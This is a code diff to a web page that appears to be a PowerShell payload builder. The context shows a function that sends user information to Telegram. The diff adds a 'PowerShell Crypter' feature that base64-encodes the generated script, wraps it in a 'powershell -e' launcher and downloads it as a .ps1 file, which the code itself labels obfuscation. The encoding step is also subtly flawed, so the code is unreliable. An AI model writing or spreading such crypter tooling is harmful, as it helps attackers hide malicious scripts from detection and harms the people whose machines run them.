@@ -86,6 +86,7 @@
             <div id="ps-output">PowerShell Code: Click to Generate</div>
             <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
             <button id="info-button" onclick="sendUserInfo()">Info</button>
+            <button id="crypt-button" onclick="createCrypter()">PowerShell Crypter</button>
         </div>
     </div>
 
@@ -184,6 +185,29 @@
                 console.error('Error:', err);
                 alert('Error sending information to Telegram. Please check your connection.');
             }
+        }
+
+        function createCrypter() {
+            if (!finalPSCode) {
+                alert("Please generate PowerShell code first.");
+                return;
+            }
+
+            // Basic obfuscation - Base64 encoding the PowerShell script
+            const encodedCode = btoa(finalPSCode);
+            const psFileContent = `$encoded = "${encodedCode}";` +
+                                  `powershell -e $encoded;`;
+
+            // Create a downloadable .ps1 file
+            const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'encrypted_script.ps1';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            alert("Encrypted PowerShell script downloaded!");
         }
     </script>
 
